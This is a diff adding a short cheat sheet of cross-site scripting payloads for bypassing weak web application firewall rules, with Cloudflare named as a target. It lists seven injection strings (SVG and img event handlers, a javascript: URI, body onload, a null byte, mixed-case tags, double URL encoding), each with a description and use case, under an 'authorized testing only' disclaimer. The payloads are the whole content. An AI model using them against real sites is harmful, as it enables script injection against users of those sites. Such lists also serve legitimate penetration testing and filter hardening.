@@ -1,0 +1,52 @@
+# Cloudflare WAF Bypass Payloads (Basic Techniques)
+
+# Purpose:
+# Demonstrates simple techniques that may bypass weak or misconfigured
+# WAF rules (including Cloudflare in certain scenarios).
+
+⚠️ For educational and authorized testing only.
+⚠️ Modern WAFs are frequently updated—these may not always work.
+
+----------------------------------------
+1. SVG Event Handler
+Payload: <svg/onload=alert(1)>
+Description: Uses SVG instead of <script>.
+Use Case: Bypass filters blocking script tags.
+
+----------------------------------------
+2. JavaScript URI
+Payload: <a href="javascript:alert(1)">
+Description: Executes JS via link.
+Use Case: When href values are not sanitized.
+
+----------------------------------------
+3. Image Error Event
+Payload: <img src=x onerror=alert(1)>
+Description: Executes on resource load failure.
+Use Case: Common fallback when <script> is blocked.
+
+----------------------------------------
+4. Body Onload
+Payload: <body onload=alert(1)>
+Description: Runs when page loads.
+Use Case: Full HTML injection scenarios.
+
+----------------------------------------
+5. Null Byte Injection
+Payload: <script>%00alert(1)</script>
+Description: Inserts null byte to break parsing.
+Use Case: Bypass poorly implemented filters.
+
+----------------------------------------
+6. Case Variation
+Payload: <ScRiPt>alert(1)</sCrIpT>
+Description: Mixed case tag.
+Use Case: Bypass case-sensitive filters.
+
+----------------------------------------
+7. Double URL Encoding
+Payload: %253Cscript%253Ealert(1)%253C%252Fscript%253E
+Description: Encoded twice.
+Use Case: Bypass filters decoding only once.
+
+----------------------------------------
